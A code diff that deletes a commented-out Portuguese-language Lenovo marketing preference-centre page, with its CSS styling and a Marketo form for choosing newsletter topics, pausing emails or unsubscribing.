@@ -1,1223 +1,423 @@
-<!--
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <title>Suas comunicações personalizadas com a Central de Preferências Lenovo</title>
-    <link rel="shortcut icon" href="https://pages.lenovo.com/rs/183-WCT-620/images/ek-favicon.png" type="image/x-icon">
-    <link rel="icon" type="image/x-icon" href="https://pages.lenovo.com/rs/183-WCT-620/images/ek-favicon.png">
-    <!-- Bootstrap core CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.12/css/all.css" integrity="sha384-G0fIWCsCzJIMAVNQPfjH08cyYaUtMwjJwqiRKxxE/rx96Uroj1BtIQ6MLJuheaO9" crossorigin="anonymous">
-    <!-- Font -->
-    <link href="https://fonts.googleapis.com/css?family=Lato:100,300,400,Montserrat:400,700" rel="stylesheet">
-    <!-- VARIABLES  -->
-    <meta name="robots" content="index, nofollow">
-    <meta name="description" content="Conte-nos sobre seus interesses na nossa Central de Preferências Lenovo e permita que lhe ofereçamos comunicações personalizadas, como você merece.">
-    <style>
-      body {
-      padding-top: 44px;
-      font-family: 'Lato', sans-serif;
-      font-size:15px;
-      color: #1e0013;
-      }
-      .nav-tabs{
-      border-bottom:0px;
-      }
-      .logo-nav{
-      position:fixed;
-      left:-50px;
-      top:50px;
-      -ms-transform: rotate(-90deg); /* IE 9 */
-      -webkit-transform: rotate(-90deg); /* Safari 3-8 */
-      transform: rotate(-90deg);
-      }
-      .navbar-brand {
-      font-family: 'Montserrat', 'Lato', sans-serif;
-      text-transform: uppercase;
-      }
-      .business-header, .business-header-second {
-      height: 60vh;
-      min-height: 500px;
-      background: url('https://pages.lenovo.com/rs/183-WCT-620/images/Image_A_2000x600_v1.jpg') center center no-repeat scroll;
-      -webkit-background-size: cover;
-      -moz-background-size: cover;
-      background-size: cover;
-      -o-background-size: cover;
-      }
-      .business-header-second{
-      background: url('https://pages.lenovo.com/rs/183-WCT-620/images/Image_B_2000x600_v1.jpg') center center no-repeat scroll;
-      -webkit-background-size: cover;
-      -moz-background-size: cover;
-      background-size: cover;
-      -o-background-size: cover;
-      }
-      .business-header .container, .business-header-second .container{
-      width:830px;
-      max-width: 100%;
-      }
-      .business-partner{
-      position: relative;
-      min-height: 500px;
-      height:60vh;
-      }
-      .business-partner h1{
-      margin:0px;
-      font-family: 'Montserrat', 'Lato', sans-serif;
-      }
-      .business-main-text, .business-main-text-second{
-      position:absolute;
-      bottom:0;
-      left:0;
-      width: 100%;
-      background-color: rgba(122,18,107,0.9);
-      color:#fff;
-      padding:50px 50px;
-      }
-      .business-main-text-second{
-      background-color:transparent;
-      padding:50px 0px;
-      }
-      .business-main-text p{
-      margin-top:30px;
-      font-family: 'Montserrat', 'Lato', sans-serif;  
-      }
-      .main-body-content .container{
-      width:830px;
-      max-width:100%;
-      }
-      .main-body-content .title{
-      padding-top: 35px;
-      padding-bottom:50px;
-      }
-      .main-body-content .title p {
-      margin-bottom:0px;
-      line-height:1.7em;
-      }
-      .navbar .container{
-      width:830px;
-      max-width:100%;
-      }
-      .nav-tabs>li.active>a, .nav-tabs>li.active>a:focus, .nav-tabs>li.active>a:hover{
-      background-color:#7A126B;
-      color:#fff;
-      border-radius:0;
-      }
-      .nav-tabs>li.active>a:focus, .nav-tabs>li.active>a:hover{
-      background-color: #7A126B;
-      }
-      .nav-tabs>li>a, .nav-tabs>li>a:hover,.nav-tabs>li>a:focus,.nav-tabs>li>a:active{
-      width:180px;
-      max-width:100%;
-      text-align:center;
-      background-color:#294e95;
-      color:#fff;
-      border-radius:0;
-      border-color:transparent;
-      text-transform:uppercase;
-      font-size: 12px;
-      cursor: pointer;
-      }
-      .nav-tabs>li>a:hover,.nav-tabs>li>a:focus,.nav-tabs>li>a:active{
-      background-color: #11184f;
-      }  
-      .colortabs{
-      background-color:#e6e2e4;
-      min-height:400px;
-      padding-top:20px;
-      padding-bottom: 20px;
-      }
-      .colortabs .tab-active{
-      border-top:1px solid #ABA8B1;
-      position:relative;
-      }
-      .colortabs .tab-pane{
-      padding-top:10px;
-      }
-      .colortabs .tab-pane img{
-      margin-right:15px;
-      }
-      .bodycontent{
-      margin-top:30px;
-      }
-      .bodycontent p.second-text{
-      margin-top:30px;
-      }
-      .bodycontent p{
-      width: 82%;
-      max-width: 100%;
-      margin-bottom:10px;
-      }
-      .colortabs .tab-active:before{
-      content: "\f078";
-      font-family: "Font Awesome 5 Free"; 
-      font-weight: 800;
-      color:#ABA8B1;
-      position:absolute;
-      top:0;
-      font-size:16px;
-      margin-top:-8px;
-      left:10%;
-      background-color:#e6e2e4;
-      }
-      .colortabs .preference:before{
-      left:33%;
-      }
-      #mt-whythink{margin-top:20px;margin-bottom:10px;}
-      a.learn-more, a.learn-more:hover{
-      background-color:#294e95;
-      color:#fff;
-      text-decoration:none;
-      margin-top:20px;
-      padding:15px;
-      display:inline-block;
-      text-transform:uppercase;
-      font-size:12px;
-      }
-      label.select-all {
-      font-size: 14px; 
-      color: #4d144a; 
-      font-weight: normal; 
-      cursor: pointer;
-      } 
-      a.learn-more:hover,a.learn-more:focus,a.learn-more:active{
-      background-color: #11184f;
-      }
-      a#update-my-prefer, a#take-a-break {
-      background-color: #7a126b;
-      color: #fff;
-      text-decoration: none;
-      margin-top: 20px;
-      min-width: 200px;
-      text-align: center;
-      padding: 15px;
-      display: inline-block;
-      text-transform: uppercase;
-      font-size: 12px;
-      }
-      a#update-my-prefer:hover,a#update-my-prefer:focus,a#update-my-prefer:active,a#take-a-break:hover,a#take-a-break:focus,a#take-a-break:active{
-      background-color: #4D144A;
-      }
-      #un-subscribe {
-      background-color: #294e95;
-      cursor: pointer;
-      color: #fff;
-      text-decoration: none;
-      margin-top: 20px;
-      padding: 15px;
-      display: inline-block;
-      text-transform: uppercase;
-      font-size: 12px;
-      }
-      #un-subscribe:hover,#un-subscribe:focus,#un-subscribe:active{
-      background-color: #11184f;
-      }
-      .mktoForm div.mktoButtonDivider { 
-      border-bottom: 1px solid #aba8b1; 
-      padding-bottom: 50px; 
-      margin-bottom: 30px; 
-      }
-      button[type="submit"]{
-      background-color: #7A126B;
-      color: #fff;
-      text-decoration: none;
-      margin-top: 20px;
-      padding: 15px;
-      display: inline-block;
-      text-transform: uppercase;
-      font-size: 12px;
-      box-shadow: none;
-      border: 0;
-      min-width:150px;
-      }     
-      button[type="submit"]:hover,button[type="submit"]:focus,button[type="submit"]:active {
-      background-color: #4D144A;  
-      }  
-      .card {
-      height: 100%;
-      }
-      /*
-      * Footer
-      */
-      .footer{
-      background-color:#e6e2e4;
-      padding:40px;
-      color:#373737;
-      }
-      .socials .nav-pills a{
-      background-color:#4e444e;
-      border-radius:0;
-      text-align: center;
-      margin: 0 2px;
-      width: 40px;
-      padding: 8px 0px 6px;
-      color:#fff;
-      }
-      .socials .nav-pills a i{
-      font-size:24px;
-      }
-      .socials .nav-pills a:hover{
-      background-color:#100013;
-      }
-      .footerinfo{
-      margin:30px auto;
-      }
-      .footerinfo p{
-      color:#fff;
-      cursor:pointer;
-      }
-      .footerinfo p i{
-      color:#fff;
-      margin-right:2px;
-      }
-      .copyrights{
-      margin-top:40px;
-      display:inline-block;
-      }
-      .copyrights p {
-      color:#000;
-      font-size:12px;
-      }
-      .copyrights a{
-      color: #000;
-      margin-left:8px;
-      }
-      .m-footerCopyRight__yearAndCompany, .m-footerCopyRight__smallLinks { color: #000;  font-size: 13px;  line-height: 20px; text-align: center; }
-      .m-footerCopyRight__yearAndCompany *, .m-footerCopyRight__smallLinks a { color: #000;  font-size: 13px;  line-height: 20px; text-align: center; }
-      .m-footerCopyRight__yearAndCompany { font-weight: bold; }
-      .m-footerCopyRight__smallLinks a { margin-right: 20px; }
-      form label{
-      font-weight:400!important;
-      }
-      /* Mobile  */
-      @media only screen and (max-width: 480px){
-      .mktoForm select.mktoField{
-      height:40px!important;
-      }
-      .maintabs{padding:0;}
-      .nav-tabs > li {
-      width: 50%;
-      }
-      .bodycontent p{
-      width:100%;
-      }
-      .bodycontent p strong{
-      padding:0!important;
-      }
-      }
-      @media only screen and (max-width: 480px), only screen and (max-device-width: 480px), only screen and (max-device-height: 480px){
-      #myprofileform {
-      padding: 0!important;
-      }
-      form{
-      padding:0px!important;
-      }
-      form img,form h1,form h4,form p,form strong{padding:0!important;}
-      .colortabs .preference:before{
-      left: 63%;
-      }
-      form input[type="text"],form input[type="email"],form input[type="tel"]{
-      padding: 20px 10px!important;
-      }
-      }
-      @media (max-width:768px){
-      .logo-nav{
-      top:0;
-      right:0;
-      -ms-transform: rotate(0deg); /* IE 9 */
-      -webkit-transform: rotate(0deg); /* Safari 3-8 */
-      transform: rotate(0deg);
-      left: auto;
-      }
-      /*Footer mobile */
-      .socials .nav-pills a{
-      width:30px;
-      }
-      .socials .nav-pills a i{
-      font-size:18px;
-      }
-      .footer{
-      padding:15px 4px;
-      }
-      /*top */
-      .business-main-text, .business-main-text-second{
-      padding:10px 15px;
-      }
-      .business-partner h1{
-      font-size:30px!important;
-      }
-      .business-header,  .business-header .business-partner{
-      height:30vh;
-      min-height:250px;
-      }
-      }
-      @media (max-width:992px){
-      .navbar .container{
-      width:660px!important;
-      max-width:100%;
-      }
-      form, fieldset, .mktoHasWidth{
-      width:100%!important;
-      }
-      }
-      @media (min-width: 992px) {
-      body {
-      padding-top: 50px;
-      }
-      }
-    </style>
-    <style>
-      @font-face {font-family: "Gotham Bold";
-      src: url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Bold.eot"); /* IE9*/
-      src: url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Bold.eot?#iefix") format("embedded-opentype"), /* IE6-IE8 */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Bold.woff2") format("woff2"), /* chrome、firefox */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Bold.woff") format("woff"), /* chrome、firefox */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Bold.ttf") format("truetype"), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Bold.svg#Gotham Book") format("svg"); /* iOS 4.1- */
-      }
-      @font-face {font-family: "Gotham Book";
-      src: url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Book.eot"); /* IE9*/
-      src: url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Book.eot?#iefix") format("embedded-opentype"), /* IE6-IE8 */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Book.woff2") format("woff2"), /* chrome、firefox */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Book.woff") format("woff"), /* chrome、firefox */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Book.ttf") format("truetype"), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Book.svg#Gotham Book") format("svg"); /* iOS 4.1- */
-      }
-      @font-face {font-family: 'Gotham Light';
-      src: url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Light.eot"); /* IE9*/
-      src: url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Light.eot?#iefix") format("embedded-opentype"), /* IE6-IE8 */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Light.woff2") format("woff2"), /* chrome、firefox */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Light.woff") format("woff"), /* chrome、firefox */
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Light.ttf") format("truetype"), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
-      url("https://pages.lenovo.com/rs/183-WCT-620/images/Gotham Light.svg#Gotham Light") format("svg"); /* iOS 4.1- */
-      }
-      body {
-      padding-top: 0;
-      }
-      h1,h2,h3,h4,h5,h6,p,span{
-      font-family: "Gotham Book"!important;
-      }
-      p{
-      font-size: 18px!important;
-      font-weight: normal!important;
-      font-stretch: normal!important;
-      font-style: normal!important;
-      line-height: 1.5!important;
-      letter-spacing: normal!important;
-      text-align: left!important;
-      color: #000000!important;
-      }
-      .business-partner h1{
-      font-family: "Gotham Bold"!important;
-      font-size: 63px!important;
-      font-weight: bold!important;
-      font-stretch: normal!important;
-      font-style: normal!important;
-      line-height: 1.1!important;
-      letter-spacing: -4px!important;
-      text-align: left!important;
-      }
-      .business-partner h1:nth-child(2){
-      color: #46c8e1!important;
-      }
-      .business-partner p{
-      font-size: 26px!important;
-      font-weight: normal!important;
-      font-stretch: normal!important;
-      font-style: normal!important;
-      line-height: 1.25!important;
-      letter-spacing: normal!important;
-      text-align: left!important;
-      color: #ffffff!important;
-      }
-      .business-header-second h1{
-      font-size: 36px!important;
-      letter-spacing: -2px!important;
-      }
-      .business-header-second p{
-      font-size: 16px!important;
-      }
-      .business-header, .business-header-second {
-      height: 60vh!important;
-      min-height: 500px!important;
-      background: url(https://pages.lenovo.com/rs/183-WCT-620/images/lp_communications_bg-min.png) center center no-repeat scroll!important;
-      }
-      .business-header-second{
-      background:url('https://pages.lenovo.com/rs/183-WCT-620/images/lp_communications_bg2-min.png') center center no-repeat scroll!important;
-      }
-      .business-main-text, .business-main-text-second {
-      position: absolute!important;
-      bottom: 76px!important;
-      left: 0!important;
-      width: 100%!important;
-      background-color: transparent!important;
-      color: #fff!important;
-      padding: 50px 0!important;
-      }
-      a.learn-more, a.learn-more:hover {
-      text-decoration: none!important;
-      margin-top: 20px!important;
-      padding: 20px 77px!important;
-      display: inline-block!important;
-      text-transform: uppercase!important;
-      background-color: transparent!important;
-      font-size: 20px!important;
-      font-weight: bold!important;
-      font-stretch: normal!important;
-      font-style: normal!important;
-      line-height: 1.2!important;
-      letter-spacing: normal!important;
-      text-align: center!important;
-      color: #46c8e1!important;
-      border: solid 2px #46c8e1!important;
-      }
-      .maintabs{
-      display:none!important;
-      }
-      #tab1{
-      display:block!important;
-      }
-      .footer {
-      background-color: #46c8e1!important;
-      padding: 40px!important;
-      color: #fff!important;
-      text-align: center!important;
-      }
-      .socials .nav-pills a {
-      background-color: transparent!important;
-      }
-      .copyrights p {
-      color: #fff!important;
-      font-size: 12px!important;
-      text-align: center!important;
-      }
-      #footerSocials{
-      display: flex!important;
-      }
-      #footerSocials ul{
-      margin: 0 auto!important;
-      }
-      .logo-nav {
-      position: fixed!important;
-      right: -50px!important;
-      left: inherit!important;
-      top: 110px!important;
-      }
-      .navbar-default,.navbar {
-      background-color: #f8f8f8!important;
-      border-color: #e7e7e7!important;
-      position: relative!important;
-      height: 0!important;
-      min-height: 0!important;
-      margin: 0!important;
-      border: none!important;
-      }
-      @media screen and (max-width: 768px){
-      .logo-nav {
-      top: 100px;
-      position: absolute!important;
-      right: -50px!important;
-      left: inherit!important;
-      -webkit-transform: rotate( -90deg);
-      transform: rotate( -90deg);
-      }
-      .business-main-text, .business-main-text-second {
-      bottom: 0;
-      }
-      .business-partner h1 {
-      font-family: "Gotham Bold"!important;
-      font-size: 29px!important;
-      letter-spacing: -2px!important;
-      }
-      .business-header, .business-header .business-partner {
-      height: 30vh;
-      min-height: 431px;
-      bottom: 0;
-      }
-      }
-    </style>
-    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
-    <link rel="icon" href="/favicon.ico" type="image/x-icon">
-    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Lato">
-    <style>.mktoGen.mktoImg {display:inline-block; line-height:0;}</style>
-    <link id="mktoForms2BaseStyle" rel="stylesheet" type="text/css" href="/js/forms2/css/forms2.css" nonce="">
-    <link id="mktoForms2ThemeStyle" rel="stylesheet" type="text/css" href="/js/forms2/css/forms2-theme-simple.css" nonce="">
-    <style>/* Add your custom CSS below */
-      form{
-      font-family: 'Lato', sans-serif!important;
-      font-size:15px!important;
-      }
-      input{
-      border: 0px;
-      padding: 8px 8px!important;
-      border-radius: 0;
-      }
-      select{
-      border: 0px;
-      padding: 8px 8px!important;
-      border-radius: 0;
-      color: #333;
-      }
-      #tab0 .mktoForm .mktoLabel{
-      float:right!important;
-      }
-      legend{
-      display:none;
-      }
-      button[type="submit"]{
-      background-color: #3d8ddd;
-      color: #fff;
-      text-decoration: none;
-      margin-top: 20px;
-      padding: 15px;
-      display: inline-block;
-      text-transform: uppercase;
-      font-size: 12px;
-      box-shadow: none;
-      border: 0;
-      min-width:150px;
-      }
-      .mktoAsterix{
-      display:none!important;}
-      /* Custom inputs */
-      .mktoCheckboxList label {
-      float:none!important;
-      line-height: 40px!important;
-      margin:0px;   
-      width:auto!important;
-      }
-      .mktoCheckboxList input {
-      margin: 13.5px 0px;
-      }
-      [title="Data Centre Offerings"], [title="PCs & Workstations"]{
-      width:auto!important;
-      }
-      #tab1 .mktoCheckboxList{
-      width:auto!important;
-      }
-      .mktoForm .mktoGutter{
-      width:0px!important;
-      }
-    </style>
-  </head>
-  <body id="bodyId">
-    <!-- Navigation -->
-    <nav class="navbar navbar-default navbar-fixed-top mktoText" id="Logo-link" style="background:#fff;">
-      <div><a class="logo-nav" href="https://www3.lenovo.com/es/es/"><img src="https://www3.lenovo.com/_ui/desktop/common/ISS_Static/WW/css/themes/owv2/images/masthead/logo-small.png"></a></div>
-      <!--div class="container">
-        <div class="navbar-header"><a class="navbar-brand" href="http://pages.lenovo.com/lenovo-preferencias-ES.html" target="_self" style="text-transform: uppercase; font-weight: 400; font-size: 1.2em;">PREFERENCIAS</a></div>
-        </div-->
-    </nav>
-    <!-- Header with Background Image -->
-    <header class="business-header">
-      <div class="container">
-        <div class="business-partner">
-          <div class="business-main-text mktoText" id="mainBanner">
-            <h1 class="display-3 text-left text-white mt-4" style="font-weight: 300; font-size: 40px;">Comunicações</h1>
-            <h1 class="display-3 text-left text-white mt-4" style="font-weight: 300; font-size: 40px;">Central de Preferências</h1>
-            <p>Selecione, personalize e controle<br> o que você recebe da Lenovo</p>
-          </div>
-        </div>
-      </div>
-    </header>
-    <!-- Page Content -->
-    <div class="main-body-content">
-      <div class="title container mktoText" id="thankyou-content">
-        <h2>Obrigado pelo seu interesse na Lenovo</h2>
-        <p>Queremos fazer de sua experiência conosco uma jornada incrível, fornecendo a você os melhores conteúdos e comunicados. Mas não podemos fazer isso sozinhos. Nós precisamos da sua ajuda!</p>
-        <p>Por isso, gostaríamos que reservasse um tempinho para verificar se não está perdendo nada que seja importante para você.</p>
-        <p>Não se esqueça que poderá voltar aqui sempre que desejar, para alterar suas preferências, perfil e assinaturas.</p>
-      </div>
-      <div class="maintabs container mktoText" id="tabstext">
-        <!-- Nav tabs -->
-        <ul class="nav nav-tabs" role="tablist">
-          <li role="presentation" class="active" id="my-profile"><a href="#myprofile" aria-controls="myprofile" role="tab" data-toggle="tab">MEU PERFIL <i class="fa fa-angle-down"></i></a></li>
-          <li role="presentation" id="my-preferences"><a href="#mypreferences" aria-controls="mypreferences" role="tab" data-toggle="tab">MINHAS PREFERÊNCIAS <i class="fa fa-angle-down"></i></a></li>
-        </ul>
-      </div>
-      <!-- End TABS -->
-      <!-- Fluid Tab Containers -->
-      <div class="colortabs">
-        <!-- Tab panes -->
-        <div class="tab-content container">
-          <div role="tabpanel" class="tab-pane tab-active active" id="myprofile">
-          </div>
-          <div role="tabpanel" class="tab-pane tab-active preference" id="mypreferences">
-          </div>
-          <!-- MKTO FORM DETAILS -->
-          <div class="mktoForm" id="myprofileform">
-            <div id="lpeCDiv_334314" class="lpeCElement BR-Preference_CentreForm_Brasil">
-              <span class="lpContentsItem formSpan">
-                <script type="text/javascript" async="" src="//munchkin.marketo.net/164/munchkin.js"></script><script src="/js/forms2/js/forms2.min.js"></script>
-                <form class="mktoForm mktoHasWidth mktoLayoutLeft" id="mktoForm_12498" novalidate="novalidate" style="font-family: Helvetica, Arial, sans-serif; font-size: 13px; color: rgb(51, 51, 51);">
-                  <style type="text/css" nonce=""></style>
-                  <div class="mktoFormRow tab" id="tab0">
-                    <fieldset class="mktoFormCol" style="padding-right: 10px; margin-bottom: 10px;">
-                      <legend></legend>
-                      <div class="mktoFormRow">
-                        <div class="mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset mktoHasWidth" style=""></div>
-                          <div class="mktoFieldWrap">
-                            <div class="mktoHtmlText mktoHasWidth" style="">
-                              <h4 style="margin-bottom: 25px;">Minhas preferências</h4>
-                            </div>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <div class="mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset mktoHasWidth" style=""></div>
-                          <div class="mktoFieldWrap">
-                            <div class="mktoHtmlText mktoHasWidth" style="">
-                              <div class="bodycontent">
-                                <p style="font-size: 15px; margin-bottom: 15px;"><strong>Nosso sistema de comunicação é ultra inteligente</strong></p>
-                                <p>Você não precisa ter acesso a todos os conteúdos. Mas também seria uma pena você perder algo muito importante que precisa saber. Queremos garantir que você receba o que é importante, na medida certa! Sem lotarmos a caixa de entrada do seu e-mail!</p>
-                              </div>
-                            </div>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <input type="text" name="Email" class="mktoField mktoFieldDescriptor mktoFormCol" style="margin-bottom: 10px; min-width: 400px;" value="" placeholder="Digite seu e-mail">
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <div class="mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset mktoHasWidth" style=""></div>
-                          <div class="mktoFieldWrap">
-                            <div class="mktoHtmlText mktoHasWidth" style="">
-                              <p style="font-size: 15px; margin-top: 20px;"><strong>Enviar informações sobre </strong></p>
-                            </div>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <div class="mktoFieldDescriptor mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset" style="width: 10px;"></div>
-                          <div class="mktoFieldWrap">
-                            <label for="communicationPreferences" id="LblcommunicationPreferences" class="mktoLabel mktoHasWidth" style="">
-                              <div class="mktoAsterix">*</div>
-                            </label>
-                            <div class="mktoGutter mktoHasWidth" style=""></div>
-                            <div class="mktoLogicalField mktoCheckboxList mktoHasWidth" style=""><input name="communicationPreferences" id="mktoCheckbox_602648_0" type="checkbox" value="Newsletter" aria-labelledby="LblcommunicationPreferences LblmktoCheckbox_602648_0 InstructcommunicationPreferences" class="mktoField single-check"><label for="mktoCheckbox_602648_0" id="LblmktoCheckbox_602648_0">Newsletter</label><input name="communicationPreferences" id="mktoCheckbox_602648_1" type="checkbox" value="Eventos e Webinars" aria-labelledby="LblcommunicationPreferences LblmktoCheckbox_602648_1 InstructcommunicationPreferences" class="mktoField single-check"><label for="mktoCheckbox_602648_1" id="LblmktoCheckbox_602648_1">Eventos e Webinars</label><input name="communicationPreferences" id="mktoCheckbox_602648_2" type="checkbox" value="Lançamento de produtos" aria-labelledby="LblcommunicationPreferences LblmktoCheckbox_602648_2 InstructcommunicationPreferences" class="mktoField single-check"><label for="mktoCheckbox_602648_2" id="LblmktoCheckbox_602648_2">Lançamento de produtos</label><input name="communicationPreferences" id="mktoCheckbox_602648_3" type="checkbox" value="Promoções e Ofertas" aria-labelledby="LblcommunicationPreferences LblmktoCheckbox_602648_3 InstructcommunicationPreferences" class="mktoField single-check"><label for="mktoCheckbox_602648_3" id="LblmktoCheckbox_602648_3">Promoções e Ofertas</label><input name="communicationPreferences" id="mktoCheckbox_602648_4" type="checkbox" value="Material Rico" aria-labelledby="LblcommunicationPreferences LblmktoCheckbox_602648_4 InstructcommunicationPreferences" class="mktoField single-check"><label for="mktoCheckbox_602648_4" id="LblmktoCheckbox_602648_4">Material Rico</label><input name="communicationPreferences" id="mktoCheckbox_602648_5" type="checkbox" value="Artigo de Blog e Blogposts" aria-labelledby="LblcommunicationPreferences LblmktoCheckbox_602648_5 InstructcommunicationPreferences" class="mktoField single-check"><label for="mktoCheckbox_602648_5" id="LblmktoCheckbox_602648_5">Artigo de Blog e Blogposts</label></div>
-                            <span id="InstructcommunicationPreferences" tabindex="-1" class="mktoInstruction"></span>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <div class="mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset mktoHasWidth" style=""></div>
-                          <div class="mktoFieldWrap">
-                            <div class="mktoHtmlText mktoHasWidth" style="">
-                              <div style="border-bottom: 1px solid #d5d5d5; padding-bottom: 50px; margin-bottom: 30px;"><a href="#" style="background-color: #3d8ddd; color: #fff; text-decoration: none; margin-top: 20px; min-width: 200px; text-align: center; padding: 15px; display: inline-block; text-transform: uppercase; font-size: 12px;" id="update-my-prefer">ATUALIZAR MINHAS PREFERÊNCIAS</a></div>
-                            </div>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <div class="mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset mktoHasWidth" style=""></div>
-                          <div class="mktoFieldWrap">
-                            <div class="mktoHtmlText mktoHasWidth" style="">
-                              <p style="font-size: 15px;"><strong>Quero fazer uma pausa nas comunicações </strong></p>
-                            </div>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <div class="mktoFieldDescriptor mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset" style="width: 10px;"></div>
-                          <div class="mktoFieldWrap">
-                            <label for="lastSourcePersonalization3" id="LbllastSourcePersonalization3" class="mktoLabel mktoHasWidth" style="">
-                              <div class="mktoAsterix">*</div>
-                            </label>
-                            <div class="mktoGutter mktoHasWidth" style=""></div>
-                            <div class="mktoLogicalField mktoCheckboxList mktoHasWidth" style=""><input name="lastSourcePersonalization3" id="mktoCheckbox_602650_0" type="checkbox" value="1 Month Break" aria-labelledby="LbllastSourcePersonalization3 LblmktoCheckbox_602650_0 InstructlastSourcePersonalization3" class="mktoField"><label for="mktoCheckbox_602650_0" id="LblmktoCheckbox_602650_0">Eu gostaria de fazer uma pausa de um mês</label><input name="lastSourcePersonalization3" id="mktoCheckbox_602650_1" type="checkbox" value="3 Month Break" aria-labelledby="LbllastSourcePersonalization3 LblmktoCheckbox_602650_1 InstructlastSourcePersonalization3" class="mktoField"><label for="mktoCheckbox_602650_1" id="LblmktoCheckbox_602650_1">Eu gostaria de fazer uma pausa de três meses</label><input name="lastSourcePersonalization3" id="mktoCheckbox_602650_2" type="checkbox" value="6 Month Break" aria-labelledby="LbllastSourcePersonalization3 LblmktoCheckbox_602650_2 InstructlastSourcePersonalization3" class="mktoField"><label for="mktoCheckbox_602650_2" id="LblmktoCheckbox_602650_2">Eu gostaria de fazer uma pausa de seis meses</label><input name="lastSourcePersonalization3" id="mktoCheckbox_602650_3" type="checkbox" value="No Break" aria-labelledby="LbllastSourcePersonalization3 LblmktoCheckbox_602650_3 InstructlastSourcePersonalization3" class="mktoField"><label for="mktoCheckbox_602650_3" id="LblmktoCheckbox_602650_3">Eu não gostaria de fazer uma pausa</label></div>
-                            <span id="InstructlastSourcePersonalization3" tabindex="-1" class="mktoInstruction"></span>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                      <div class="mktoFormRow">
-                        <div class="mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset mktoHasWidth" style=""></div>
-                          <div class="mktoFieldWrap">
-                            <div class="mktoHtmlText mktoHasWidth" style="">
-                              <div style="border-bottom: 1px solid #d5d5d5; padding-bottom: 50px; margin-bottom: 30px;"><a href="#" style="background-color: #3d8ddd; color: #fff; text-decoration: none; margin-top: 20px; min-width: 200px; text-align: center; padding: 15px; display: inline-block; text-transform: uppercase; font-size: 12px;" id="take-a-break">Dar um tempo</a></div>
-                            </div>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
-                    </fieldset>
-                    <div class="mktoClear"></div>
-                  </div>
-                  <div class="mktoFormRow tab" id="tab1" style="display: none;">
-                    <fieldset class="mktoFormCol" style="padding-right: 10px; margin-bottom: 10px;">
-                      <legend></legend>
-                      <div class="mktoFormRow">
-                        <div class="mktoFormCol" style="margin-bottom: 10px;">
-                          <div class="mktoOffset mktoHasWidth" style=""></div>
-                          <div class="mktoFieldWrap">
-                            <div class="mktoHtmlText mktoHasWidth" style="">
-                              <p id="unsubscribe-text" style="font-size: 15px;"><strong>Cancelar a assinatura de todas as comunicações</strong></p>
-                              <span style="background-color: #68747e; cursor: pointer; color: #fff; text-decoration: none; margin-top: 20px; padding: 15px; display: inline-block; text-transform: uppercase; font-size: 12px;" id="un-subscribe">Cancelar inscrição de tudo</span>
-                            </div>
-                            <div class="mktoClear"></div>
-                          </div>
-                          <div class="mktoClear"></div>
-                        </div>
-                        <div class="mktoClear"></div>
-                      </div>
